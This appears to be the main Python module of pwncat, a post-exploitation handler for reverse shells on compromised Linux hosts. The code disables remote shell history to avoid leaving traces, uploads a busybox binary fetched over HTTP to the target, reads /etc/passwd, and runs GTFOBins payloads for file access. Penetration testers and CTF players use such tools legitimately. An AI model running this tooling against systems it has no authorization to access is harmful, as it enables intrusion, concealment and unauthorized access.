#!/usr/bin/env python3
from typing import Dict, Optional, Iterable, IO, Callable, Any
from prompt_toolkit import PromptSession, ANSI
from prompt_toolkit.shortcuts import ProgressBar
from prompt_toolkit.completion import (
    Completer,
    PathCompleter,
    Completion,
    CompleteEvent,
    NestedCompleter,
    WordCompleter,
    merge_completers,
)
from prompt_toolkit.document import Document
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.lexers import PygmentsLexer
from functools import wraps
import subprocess
import traceback
import requests
import tempfile
import logging
import argparse
import base64
import time
import socket
import enum
import shlex
import sys
import os
import re
import io

from pwncat.util import State
from pwncat import util
from pwncat import downloader, uploader, privesc
from pwncat.file import RemoteBinaryPipe
from pwncat.lexer import LocalCommandLexer, PwncatStyle
from pwncat.gtfobins import GTFOBins, Capability, Stream
from pwncat.commands import CommandParser
from pwncat.config import Config, KeyType

from colorama import Fore


def with_parser(f):
    @wraps(f)
    def _decorator(self, argv):
        try:
            parser = getattr(self, f.__name__.split("do_")[1] + "_parser")
            args = parser.parse_args(argv)
        except SystemExit:
            return
        return f(self, args)

    return _decorator


class RemotePathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.text_before_cursor.split()[-1]
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        delim = self.pty.process(f"ls -1 -a {shlex.quote(path)}", delim=True)

        name = self.pty.recvuntil(b"\n").strip()
        while name != delim:
            name = name.decode("utf-8")
            if name.startswith(partial_name):
                yield Completion(
                    name,
                    start_position=-len(partial_name),
                    display=[("#ff0000", "(remote)"), ("", f" {name}")],
                )
            name = self.pty.recvuntil(b"\n").strip()


class LocalPathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.text_before_cursor.split()[-1]
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        # Ensure the directory exists
        if not os.path.isdir(path):
            return

        for name in os.listdir(path):
            if name.startswith(partial_name):
                yield Completion(
                    name,
                    start_position=-len(partial_name),
                    display=[("fg:ansiyellow", "(local)"), ("", f" {name}")],
                )


class CommandCompleter(Completer):
    def __init__(self, description):
        self.description = description

    def get_completions(
        self, document: Document, complete_event: CompleteEvent
    ) -> Iterable[Completion]:
        # Split document.
        text = document.text_before_cursor.lstrip()
        stripped_len = len(document.text_before_cursor) - len(text)
        prev_term: Optional[str]

        # If there is a space, check for the first term, and use a
        # subcompleter.
        if " " in text:
            first_term = text.split()[0]
            command = self.description.get(first_term)

            # If we have a sub completer, use this for the completions.
            if command is not None:
                options = [k for k in command if k != "positional"]
                terms = text.split(" ")

                if len(terms) > 2:
                    prev_term = terms[-2]
                else:
                    prev_term = None

                if prev_term in options:
                    completer = command[prev_term]
                else:
                    positionals = command.get("positional", [])
                    completer = merge_completers(
                        [WordCompleter(options, ignore_case=False)] + positionals
                    )

                for c in completer.get_completions(document, complete_event):
                    yield c

        # No space in the input: behave exactly like `WordCompleter`.
        else:
            completer = WordCompleter(list(self.description.keys()), ignore_case=False)
            for c in completer.get_completions(document, complete_event):
                yield c


class PtyHandler:
    """ Handles creating the pty on the remote end and locally processing input
    on the local end """

    OPEN_METHODS = {
        "script-util-linux": "exec {} -qc {} /dev/null 2>&1",
        "script-other": "exec {} -q /dev/null {}",
        "python": "exec {} -c \"import pty; pty.spawn('{}')\" 2>&1",
    }

    INTERESTING_BINARIES = [
        "python",
        "python2",
        "python3",
        "perl",
        "bash",
        "dash",
        "zsh",
        "sh",
        "curl",
        "wget",
        "nc",
        "netcat",
        "ncat",
        "script",
    ]

    def __init__(self, client: socket.SocketType, config_path: str):
        """ Initialize a new Pty Handler. This will handle creating the PTY and
        setting the local terminal to raw. It also maintains the state to open a
        local terminal if requested and exit raw mode. """

        self.config = Config(self)
        self.client = client
        self._state = State.COMMAND
        self.saved_term_state = None
        self.input = b""
        self.lhost = None
        self.known_binaries: Dict[str, Optional[str]] = {}
        self.known_users: Dict[str, Any] = {}
        self.vars = {"lhost": util.get_ip_addr()}
        self.remote_prefix = "\\[\\033[01;31m\\](remote)\\[\\033[00m\\]"
        self.remote_prompt = (
            "\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\["
            "\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ "
        )
        self.prompt = self.build_prompt_session()
        self.has_busybox = False
        self.busybox_path: Optional[str] = None
        self.binary_aliases = {
            "python": [
                "python2",
                "python3",
                "python2.7",
                "python3.6",
                "python3.8",
                "python3.9",
            ],
            "sh": ["bash", "zsh", "dash"],
            "nc": ["netcat", "ncat"],
        }
        self.gtfo: GTFOBins = GTFOBins("data/gtfobins.json", self.which)
        self.default_privkey = "./data/pwncat"
        self.has_prefix = False
        self.command_parser = CommandParser(self)

        # Run the configuration script
        with open(config_path, "r") as filp:
            config_script = filp.read()
        self.command_parser.eval(config_script, config_path)

        # We should always get a response within 3 seconds...
        self.client.settimeout(1)

        util.info("probing for prompt...", overlay=True)
        start = time.time()
        prompt = b""
        try:
            while time.time() < (start + 0.1):
                prompt += self.client.recv(1)
        except socket.timeout:
            pass

        # We assume if we got data before sending data, there is a prompt
        if prompt != b"":
            self.has_prompt = True
            util.info(f"found a prompt", overlay=True)
        else:
            self.has_prompt = False
            util.info("no prompt observed", overlay=True)

        # Send commands without a new line, and see if the characters are echoed
        util.info("checking for echoing", overlay=True)
        test_cmd = b"echo"
        self.client.send(test_cmd)
        response = b""

        try:
            while len(response) < len(test_cmd):
                response += self.client.recv(len(test_cmd) - len(response))
        except socket.timeout:
            pass

        if response == test_cmd:
            self.has_echo = True
            util.info("found input echo", overlay=True)
        else:
            self.has_echo = False
            util.info(f"no echo observed", overlay=True)

        self.client.send(b"\n")
        response = self.client.recv(1)
        if response == "\r":
            self.client.recv(1)
            self.has_cr = True
        else:
            self.has_cr = False

        if self.has_echo:
            self.recvuntil(b"\n")

        # Attempt to identify architecture
        self.arch = self.run("uname -m").decode("utf-8").strip()
        if self.arch == "amd64":
            self.arch = "x86_64"

        # Ensure history is disabled
        util.info("disabling remote command history", overlay=True)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')

        self.shell = self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
        self.shell = self.which(self.shell.split(" ")[0])
        util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")

        # Locate interesting binaries
        # The auto-resolving doesn't work correctly until we have a pty
        # so, we manually resolve a list of useful binaries prior to spawning
        # a pty
        for name in PtyHandler.INTERESTING_BINARIES:
            util.info(
                f"resolving remote binary: {Fore.YELLOW}{name}{Fore.RESET}",
                overlay=True,
            )

            # Look for the given binary
            response = self.run(f"which {shlex.quote(name)}").strip()
            if response == b"":
                continue

            self.known_binaries[name] = response.decode("utf-8")

        # Now, we can resolve using `which` w/ request=False for the different
        # methods
        if self.which("python") is not None:
            method_cmd = PtyHandler.OPEN_METHODS["python"].format(
                self.which("python"), self.shell
            )
            method = "python"
        elif self.which("script") is not None:
            result = self.run("script --version")
            if b"linux" in result:
                method_cmd = f"exec script -qc {self.shell} /dev/null"
                method = "script (util-linux)"
            else:
                method_cmd = f"exec script -q /dev/null {self.shell}"
                method = "script (probably bsd)"
            method = "script"
        else:
            util.error("no available methods to spawn a pty!")
            raise RuntimeError("no available methods to spawn a pty!")

        # Open the PTY
        util.info(
            f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
        )
        self.run(method_cmd, wait=False)
        # client.sendall(method_cmd.encode("utf-8") + b"\n")

        # We just started a PTY, so we now have all three
        self.has_echo = True
        self.has_cr = True
        self.has_prompt = True

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')

        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
        # opened)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        # Disable automatic margins, which fuck up the prompt
        self.run("tput rmam")

        self.privesc = privesc.Finder(self)

        # Save our terminal state
        self.stty_saved = self.run("stty -g").decode("utf-8").strip()

        # The session is fully setup now
        self.command_parser.loaded = True

        # Synchronize the terminals
        self.command_parser.dispatch_line("sync")

        # Force the local TTY to enter raw mode
        self.state = State.RAW

    def bootstrap_busybox(self, url):
        """ Utilize the architecture we grabbed from `uname -m` to grab a
        precompiled busybox binary and upload it to the remote machine. This
        makes uploading/downloading and dependency tracking easier. It also
        makes file upload/download safer, since we have a known good set of 
        commands we can run (rather than relying on GTFObins) """

        if self.has_busybox:
            util.success("busybox is already available!")
            return

        busybox_remote_path = self.which("busybox")

        if busybox_remote_path is None:

            # We use the stable busybox version at the time of writing. This should
            # probably be configurable.
            busybox_url = url.rstrip("/") + "/busybox-{arch}"

            # Attempt to download the busybox binary
            r = requests.get(busybox_url.format(arch=self.arch), stream=True)

            # No busybox support
            if r.status_code == 404:
                util.warn(f"no busybox for architecture: {self.arch}")
                return

            # Grab the content length if provided
            length = r.headers.get("Content-Length", None)
            if length is not None:
                length = int(length)

            # Stage a temporary file for busybox
            busybox_remote_path = (
                self.run("mktemp -t busyboxXXXXX").decode("utf-8").strip()
            )

            # Open the remote file for writing
            with self.open(busybox_remote_path, "wb", length=length) as filp:

                # Local function for transferring the content
                def transfer(on_progress):
                    for chunk in r.iter_content(chunk_size=1024 * 1024):
                        filp.write(chunk)
                        on_progress(len(chunk))

                # Run the transfer with a progress bar
                util.with_progress(
                    f"uploading busybox for {self.arch}", transfer, length,
                )

            # Make busybox executable
            self.run(f"chmod +x {shlex.quote(busybox_remote_path)}")

            util.success(
                f"uploaded busybox to {Fore.GREEN}{busybox_remote_path}{Fore.RESET}"
            )

        else:
            # Busybox was provided on the system!
            util.success(f"busybox already installed on remote system!")

        # Check what this busybox provides
        util.progress("enumerating provided applets")
        pipe = self.subprocess(f"{shlex.quote(busybox_remote_path)} --list")
        provides = pipe.read().decode("utf-8").strip().split("\n")
        pipe.close()

        # prune any entries which the system marks as SETUID or SETGID
        stat = self.which("stat", quote=True)

        if stat is not None:
            util.progress("enumerating remote binary permissions")
            which_provides = [f"`which {p}`" for p in provides]
            new_provides = []

            with self.subprocess(
                f"{stat} -c %A {' '.join(which_provides)}", "r"
            ) as pipe:
                for name, perms in zip(provides, pipe):
                    perms = perms.decode("utf-8").strip().lower()
                    if "no such" in perms:
                        # The remote system doesn't have this binary
                        continue
                    if "s" not in perms:
                        util.progress(
                            f"keeping {Fore.BLUE}{name}{Fore.RESET} in busybox"
                        )
                        new_provides.append(name)
                    else:
                        util.progress(
                            f"pruning {Fore.RED}{name}{Fore.RESET} from busybox"
                        )

            util.success(f"pruned {len(provides)-len(new_provides)} setuid entries")
            provides = new_provides

        # Let the class know we now have access to busybox
        self.busybox_provides = provides
        self.has_busybox = True
        self.busybox_path = busybox_remote_path

    def build_prompt_session(self):
        """ This is kind of gross because of the nested completer, so I broke
        it out on it's own. The nested completer must be updated separately
        whenever a new command or a command argument is changed. """

        remote_completer = RemotePathCompleter(self)
        local_completer = LocalPathCompleter(self)
        download_method_completer = WordCompleter(downloader.get_names())
        upload_method_completer = WordCompleter(uploader.get_names())

        completer_graph = {
            "download": {
                "-m": download_method_completer,
                "--method": download_method_completer,
                "-o": local_completer,
                "--output": local_completer,
                "positional": [remote_completer],
            },
            "upload": {
                "-m": upload_method_completer,
                "--method": upload_method_completer,
                "-o": remote_completer,
                "--output": remote_completer,
                "positional": [local_completer],
            },
            "back": None,
            "sync": None,
            "help": None,
        }

        return PromptSession(
            [
                ("fg:ansiyellow bold", "(local) "),
                ("fg:ansimagenta bold", "pwncat"),
                ("", "$ "),
            ],
            completer=CommandCompleter(completer_graph),
            auto_suggest=AutoSuggestFromHistory(),
            lexer=PygmentsLexer(LocalCommandLexer),
            style=PwncatStyle,
            complete_while_typing=False,
        )

    def which(self, name: str, request=True, quote=False) -> Optional[str]:
        """ Call which on the remote host and return the path. The results are
        cached to decrease the number of remote calls. """
        path = None

        if self.has_busybox:
            if name in self.busybox_provides:
                if quote:
                    return f"{shlex.quote(str(self.busybox_path))} {name}"
                else:
                    return f"{self.busybox_path} {name}"

        if name in self.known_binaries and self.known_binaries[name] is not None:
            # Cached value available
            path = self.known_binaries[name]
        elif name not in self.known_binaries and request:
            # It hasn't been looked up before, request it.
            path = self.run(f"which {shlex.quote(name)}").decode("utf-8").strip()
            if path == "" or "which: no" in path:
                path = None

        if name in self.binary_aliases and path is None:
            # Look for aliases of this command as a last resort
            for alias in self.binary_aliases[name]:
                path = self.which(alias, quote=False)
                if path is not None:
                    break

        # Cache the value
        self.known_binaries[name] = path

        if quote and path is not None:
            path = shlex.quote(path)

        return path

    def process_input(self, data: bytes):
        r""" Process a new byte of input from stdin. This is to catch "\r~C" and open
        a local prompt """

        if self.has_prefix:
            if data == self.config["prefix"].value:
                self.client.send(data)
            else:
                try:
                    binding = self.config.binding(data)

                    # Pass is a special case that can be used at the beginning of a
                    # command.
                    if binding.strip().startswith("pass"):
                        self.client.send(data)
                        binding = binding.lstrip("pass")

                    self.restore_local_term()
                    sys.stdout.write("\n")

                    # Evaluate the script
                    self.command_parser.eval(binding, "<binding>")

                    self.flush_output()
                    self.client.send(b"\n")
                    self.saved_term_state = util.enter_raw_mode()

                except KeyError:
                    pass
            self.has_prefix = False
        elif data == self.config["prefix"].value:
            self.has_prefix = True
        elif data == KeyType("c-d").value:
            # Don't allow exiting the remote prompt with C-d
            # you should have a keybinding for "<prefix> C-d" to actually send
            # C-d.
            self.state = State.COMMAND
        else:
            self.client.send(data)

    def recv(self) -> bytes:
        """ Recieve data from the client """
        return self.client.recv(4096)

    @property
    def state(self) -> State:
        return self._state

    @state.setter
    def state(self, value: State):
        if value == self._state:
            return

        if value == State.RAW:
            self.flush_output()
            self.client.send(b"\n")
            util.success("pwncat is ready 🐈")
            self.saved_term_state = util.enter_raw_mode()
            self.command_parser.running = False
            self._state = value
            return
        if value == State.COMMAND:
            # Go back to normal mode
            self.restore_local_term()
            self._state = State.COMMAND
            # Hopefully this fixes weird cursor position issues
            util.success("local terminal restored")
            # Setting the state to local command mode does not return until
            # command processing is complete.
            self.command_parser.run()
            return
        if value == State.SINGLE:
            # Go back to normal mode
            self.restore_local_term()
            self._state = State.SINGLE
            # Hopefully this fixes weird cursor position issues
            sys.stdout.write("\n")
            # Setting the state to local command mode does not return until
            # command processing is complete.
            self.command_parser.run_single()

            # Go back to raw mode
            self.flush_output()
            self.client.send(b"\n")
            self.saved_term_state = util.enter_raw_mode()
            self._state = State.RAW
            return

    def restore_local_term(self):
        """ Save the local terminal state """
        util.restore_terminal(self.saved_term_state)

    def run(self, cmd, wait=True, input: bytes = b"") -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        sdelim, edelim = self.process(cmd, delim=wait)

        if wait:

            response = self.recvuntil(edelim)
            response = response.split(edelim.encode("utf-8"))[0]
            if sdelim.encode("utf-8") in response:
                response = b"\n".join(response.split(b"\n")[1:])

            self.flush_output()
        else:
            response = edelim.encode("utf-8")

        if callable(input):
            input()
        elif input:
            self.client.send(input)

        return response

    def process(self, cmd, delim=True) -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        sdelim = util.random_string(10)
        edelim = util.random_string(10)

        if delim:
            command = f" echo; echo {sdelim}; {cmd}; echo {edelim}"
        else:
            command = f" {cmd}"

        response = b""
        eol = b"\r"
        if self.has_cr:
            eol = b"\r"

        # Send the command to the remote host
        self.client.send(command.encode("utf-8") + b"\n")

        if delim:
            # Receive until we get our starting delimeter on a line by itself
            while not self.recvuntil("\n").startswith(sdelim.encode("utf-8")):
                pass

        return sdelim, edelim

    def subprocess(
        self,
        cmd,
        mode="rb",
        data: bytes = None,
        exit_cmd: str = None,
        no_job=False,
        name: str = None,
    ) -> RemoteBinaryPipe:
        """ Create an asynchronous child on the remote end and return a
        file-like object which can communicate with it's standard output. The 
        remote terminal is placed in raw mode with no-echo first, and the
        command is run on a separate background shell w/ no standard input. The
        output of the command can be retrieved through the returned file-like
        object. You **must** either call `close()` of the pipe, or read until
        eof, or the PTY will not be restored to a normal state.

        If `close()` is called prior to EOF, the remote process will be killed,
        and any remaining output will be flushed prior to resetting the terminal.
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        for c in mode:
            if c not in "rwb":
                raise ValueError("mode must only contain 'r', 'w' and 'b'")

        sdelim = util.random_string(10)  # "_PWNCAT_STARTDELIM_"
        edelim = util.random_string(10)  # "_PWNCAT_ENDDELIM_"

        # List of ";" separated commands that will be run
        commands: List[str] = []
        # Clear the prompt, or it will get displayed in our output due to the
        # background task
        commands.append(" export PS1=")
        # Needed to disable job control messages in bash
        commands.append("set +m")
        # This is gross, but it allows us to recieve stderr and stdout, while
        # ignoring the job control start message.
        if "w" not in mode and not no_job:
            commands.append(
                f"{{ echo; echo {sdelim}; {cmd} && echo {edelim} || echo {edelim} & }} 2>/dev/null"
            )
        else:
            # This is dangerous. We are in raw mode, and if the process never
            # ends and doesn't provide a way to exit, then we are stuck.
            commands.append(f"echo; echo {sdelim}; {cmd}; echo {edelim}")
        # Re-enable normal job control in bash
        commands.append("set -m")

        # Join them all into one command
        command = ";".join(commands).encode("utf-8")

        # Enter raw mode w/ no echo on the remote terminal
        # DANGER
        if "b" in mode:
            self.raw(echo=False)

        self.client.sendall(command + b"\n")

        while not self.recvuntil(b"\n").startswith(sdelim.encode("utf-8")):
            continue

        # Send the data if requested
        if callable(data):
            data()
        elif data is not None:
            self.client.sendall(data)

        pipe = RemoteBinaryPipe(self, mode, edelim.encode("utf-8"), True, exit_cmd)
        pipe.name = name

        if "w" in mode:
            wrapped = io.BufferedRWPair(pipe, pipe)
            wrapped.name = pipe.name
            pipe = wrapped
        else:
            pipe = io.BufferedReader(pipe)

        return pipe

    def do_test(self, argv):

        util.info("Attempting to stream data to a remote file...")
        with self.open("/tmp/stream_test", "w") as filp:
            filp.write("It fucking worked!")

        util.info("Attempting to stream the data back...")
        with self.open("/tmp/stream_test", "r") as filp:
            print(filp.read())

    def get_file_size(self, path: str):
        """ Get the size of a remote file """

        stat = self.which("stat")
        if stat is None:
            return None

        test = self.which("test")
        if test is None:
            test = self.which("[")

        if test is not None:
            result = self.run(
                f"{test} -e {shlex.quote(path)} && echo exists;"
                f"{test} -r {shlex.quote(path)} && echo readable"
            )
            if b"exists" not in result:
                raise FileNotFoundError(f"No such file or directory: '{path}'")
            if b"readable" not in result:
                raise PermissionError(f"Permission denied: '{path}'")

        size = self.run(f"{stat} -c %s {shlex.quote(path)}").decode("utf-8").strip()
        try:
            size = int(size)
        except ValueError:
            return None

        return size

    def access(self, path: str) -> util.Access:

        access: util.Access = util.Access.NONE

        # Find test
        test = self.which("test")
        if test is None:
            test = self.which("[")

        # Quote the path
        parent = shlex.quote(os.path.dirname(path))
        path = shlex.quote(path)

        if test is not None:
            result = self.run(
                f"{test} -x {path} && echo execute;"
                f"{test} -w {path} && echo write;"
                f"{test} -r {path} && echo read;"
                f"{test} -e {path} && echo exists;"
                f"{test} -g {path} && echo sgid;"
                f"{test} -u {path} && echo suid;"
                f"{test} -d {path} && echo directory;"
                f"{test} -f {path} && echo regular;"
                f"{test} -d {parent} && echo parent_dir;"
                f"{test} -w {parent} && echo parent_write"
            )
            if b"execute" in result:
                access |= util.Access.EXECUTE
            if b"exists" in result:
                access |= util.Access.EXISTS
            if b"write" in result or (
                b"parent_write" in result and not b"exists" in result
            ):
                access |= util.Access.WRITE
            if b"read" in result:
                access |= util.Access.READ
            if b"suid" in result:
                access |= util.Access.SUID
            if b"sgid" in result:
                access |= util.Access.SGID
            if b"directory" in result:
                access |= util.Access.DIRECTORY
            elif b"file" in result:
                access |= util.Access.REGULAR

        return access

    def open_read(self, path: str, mode: str):
        """ Open a remote file for reading """

        method = None
        binary_path = None
        stream = Stream.ANY

        test = self.which("test")
        if test is None:
            test = self.which("[")

        if test is not None:
            result = self.run(
                f"{test} -e {shlex.quote(path)} && echo exists;"
                f"{test} -r {shlex.quote(path)} && echo readable"
            )
            if b"exists" not in result:
                raise FileNotFoundError(f"No such file or directory: '{path}'")
            if b"readable" not in result:
                raise PermissionError(f"Permission denied: '{path}'")

        # If we want binary transfer, we can't use Stream.PRINT
        if "b" in mode:
            stream = stream & ~Stream.PRINT

        try:
            # Find a reader from GTFObins
            method = next(self.gtfo.iter_methods(caps=Capability.READ, stream=stream))
        except StopIteration:
            raise RuntimeError("no available gtfobins readers!")

        # Build the payload
        payload, input_data, exit_cmd = method.build(lfile=path, suid=True)

        sub_mode = "r"
        no_job = True
        if method.stream is Stream.RAW:
            sub_mode += "b"

        # Run the payload on the remote host.
        pipe = self.subprocess(
            payload,
            sub_mode,
            no_job=no_job,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            name=path,
        )

        # Wrap the pipe in the decoder for this method (possible base64)
        pipe = method.wrap_stream(pipe)

        # Return the appropriate text or binary mode pipe
        if "b" not in mode:
            pipe = io.TextIOWrapper(io.BufferedReader(pipe))

        return pipe

    def open_write(self, path: str, mode: str, length=None) -> IO:
        """ Open a remote file for writing """

        method = None
        stream = Stream.ANY

        test = self.which("test")
        if test is None:
            test = self.which("[")

        # Try to save ourselves...
        if test is not None:
            result = self.run(
                f"{test} -e {shlex.quote(path)} && echo exists;"
                f"{test} -d {shlex.quote(path)} && echo directory;"
                f"{test} -w {shlex.quote(path)} && echo writable"
            )
            if b"directory" in result:
                raise IsADirectoryError(f"Is a directory: '{path}'")
            if b"exists" in result and not b"writable" in result:
                raise PermissionError(f"Permission denied: '{path}'")
            if b"exists" not in result:
                parent = os.path.dirname(path)
                result = self.run(
                    f"{test} -d {shlex.quote(parent)} && echo exists;"
                    f"{test} -w {shlex.quote(parent)} && echo writable"
                )
                if b"exists" not in result:
                    raise FileNotFoundError(f"No such file or directory: '{path}'")
                if b"writable" not in result:
                    raise PermissionError(f"Permission denied: '{path}'")

        # If we want binary transfer, we can't use Stream.PRINT
        if "b" in mode:
            stream = stream & ~Stream.PRINT

        # We can't do raw streams without a known length
        if length is None:
            stream = stream & ~Stream.RAW

        try:
            # Find a reader from GTFObins
            method = next(self.gtfo.iter_methods(caps=Capability.WRITE, stream=stream))
        except StopIteration:
            raise RuntimeError("no available gtfobins readers!")

        # Build the payload
        payload, input_data, exit_cmd = method.build(
            lfile=path, length=length, suid=True
        )

        sub_mode = "w"
        if method.stream is Stream.RAW:
            sub_mode += "b"

        # Run the payload on the remote host.
        pipe = self.subprocess(
            payload,
            sub_mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            name=path,
        )

        # Wrap the pipe in the decoder for this method (possible base64)
        pipe = method.wrap_stream(pipe)

        # Return the appropriate text or binary mode pipe
        if "b" not in mode:
            pipe = io.TextIOWrapper(io.BufferedWriter(pipe))

        return pipe

    def open(self, path: str, mode: str, length=None):
        """ Generically open a remote file for reading or writing. Does not
        support simultaneously read and write. TextIO is implemented with a 
        TextIOWrapper. No other remote interaction should occur until this
        stream is closed. """

        # We can't do simultaneous read and write
        if "r" in mode and "w" in mode:
            raise ValueError("only one of 'r' or 'w' may be specified")

        if "r" in mode:
            pipe = self.open_read(path, mode)
        else:
            pipe = self.open_write(path, mode, length)

        return pipe

    def tempfile(self, mode: str, length: int = None):
        """ Create a temporary file on the remote system and return an open file
        handle to it. This uses `mktemp` on the remote system to create the file
        and then opens it with `PtyHandler.open`. """

        # Reading a new temporary file doesn't make sense
        if "w" not in mode:
            raise ValueError("expected write mode for temporary files")

        mktemp = self.which("mktemp")
        if mktemp is None:
            path = "/tmp/tmp" + util.random_string(8)
        else:
            path = self.run(mktemp).strip().decode("utf-8")

        return self.open(path, mode, length=length)

    def raw(self, echo: bool = False):
        self.stty_saved = self.run("stty -g").decode("utf-8").strip()
        # self.run("stty raw -echo", wait=False)
        self.process("stty raw -echo", delim=False)
        self.has_cr = False
        self.has_echo = False

    def restore_remote(self):
        self.run(f"stty {self.stty_saved}", wait=False)
        self.flush_output()
        self.has_cr = True
        self.has_echo = True
        self.run("echo")
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")

    def flush_output(self, some=False):
        output = b""
        old_timeout = self.client.gettimeout()
        self.client.settimeout(0)

        while True:
            try:
                new = self.client.recv(4096)
                if len(new) == 0:
                    if len(output) > 0 or some == False:
                        break
                output += new
            except (socket.timeout, BlockingIOError):
                if len(output) > 0 or some == False:
                    break

        self.client.settimeout(old_timeout)

    def peek_output(self, some=False):
        """ Retrieve the currently waiting data in the buffer. Stops on first 
        timeout """
        output = b""
        old_blocking = self.client.getblocking()
        old_timeout = self.client.gettimeout()
        self.client.settimeout(1)

        while True:
            try:
                output2 = self.client.recv(len(output) + 1, socket.MSG_PEEK)
                if len(output2) <= len(output):
                    break
                output = output2
            except (socket.timeout, BlockingIOError):
                if output == b"" and some:
                    continue
                break

        self.client.settimeout(old_timeout)

        return output

    def reset(self):
        self.run("reset", wait=False)
        self.has_cr = True
        self.has_echo = True
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
        self.run(f"tput rmam")

    def recvuntil(self, needle: bytes, flags=0, interp=False):
        """ Recieve data from the client until the specified string appears """

        if isinstance(needle, str):
            needle = needle.encode("utf-8")

        result = b""
        while not result.endswith(needle):
            try:
                data = self.client.recv(1, flags)
                # Bash sends some **WEIRD** shit and wraps it in backspace
                # characters for some reason. When asked, we interpret the
                # backspace characters so the response is what we expect.
                if interp and data == b"\x08":
                    if len(result) > 0:
                        result = result[:-1]
                else:
                    result += data
            except (socket.timeout, BlockingIOError):
                continue  # force waiting

        return result

    def whoami(self):
        result = self.run("whoami")
        return result.strip().decode("utf-8")

    def getenv(self, name: str):
        """ Get the value of the given environment variable on the remote host
        """
        return self.run(f"echo -n ${{{name}}}").decode("utf-8")

    @property
    def id(self):

        id_output = self.run("id").decode("utf-8")

        pieces = id_output.split(" ")
        props = {}
        for p in pieces:
            segments = p.split("=")
            props[segments[0]] = segments[1]

        id_properties = {}
        for key, value in props.items():
            if key == "groups":
                groups = []
                for group in value.split(","):
                    p = group.split("(")
                    groups.append({"id": int(p[0]), "name": p[1].split(")")[0]})
                id_properties["groups"] = groups
            elif key == "context":
                id_properties["context"] = value.split(":")
            else:
                p = value.split("(")
                id_properties[key] = {"id": int(p[0]), "name": p[1].split(")")[0]}

        if "euid" not in id_properties:
            id_properties["euid"] = id_properties["uid"]

        if "egid" not in id_properties:
            id_properties["egid"] = id_properties["gid"]

        if "context" not in id_properties:
            id_properties["context"] = []

        return id_properties

    def reload_users(self):
        """ Clear user cache and reload it """
        self.known_users = None
        return self.users

    @property
    def users(self):
        if self.known_users:
            return self.known_users

        self.known_users = {}

        passwd = self.run("cat /etc/passwd").decode("utf-8")
        for line in passwd.split("\n"):
            line = line.strip()
            if line == "" or line[0] == "#":
                continue
            line = line.strip().split(":")

            user_data = {
                "name": line[0],
                "password": None,
                "uid": int(line[2]),
                "gid": int(line[3]),
                "description": line[4],
                "home": line[5],
                "shell": line[6],
            }
            self.known_users[line[0]] = user_data

        return self.known_users

    @property
    def current_user(self):
        name = self.whoami()
        if name in self.users:
            return self.users[name]
        return None
